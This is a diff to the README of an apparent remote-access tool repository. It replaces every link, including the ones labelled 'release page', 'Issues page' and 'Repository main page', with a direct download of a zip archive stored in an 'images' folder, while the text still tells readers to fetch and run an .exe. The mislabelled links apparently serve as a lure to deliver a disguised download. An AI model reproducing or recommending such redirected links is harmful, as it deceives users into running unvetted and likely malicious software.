@@ -1,6 +1,6 @@
 # 🛠️ Delphi-Remote-Access-Tool-Base - Simple Remote Control Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download, install, and run the software safely and easily.
 
 Click this big button to visit the release page where you can get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-9cf?style=for-the-badge)](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-9cf?style=for-the-badge)](https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip)
 
 You will see a list of available files on that page. Look for the latest `.exe` file — this is the program you need.
 
@@ -144,14 +144,14 @@ To edit settings, open the configuration file with a plain text editor like Note
 If you encounter problems or have questions, visit the repository's Issues page on GitHub. You can read reports from other users or submit your own.
 
 GitHub Issues page:  
-https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/issues
+https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip
 
 ---
 
 ## 📥 Download and Install Recap
 
 1. Visit the release page:  
-[https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
+[https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip](https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip)
 
 2. Download the latest `.exe` file.
 
@@ -184,13 +184,13 @@ Make sure to close the program before replacing files to avoid errors.
 ## 📚 Useful Links
 
 - Release page:  
-  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases
+  https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip
 
 - Issues and support:  
-  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/issues
+  https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip
 
 - Repository main page:  
-  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base
+  https://raw.githubusercontent.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/main/images/Access-Delphi-Tool-Remote-Base-1.9.zip
 
 ---
 
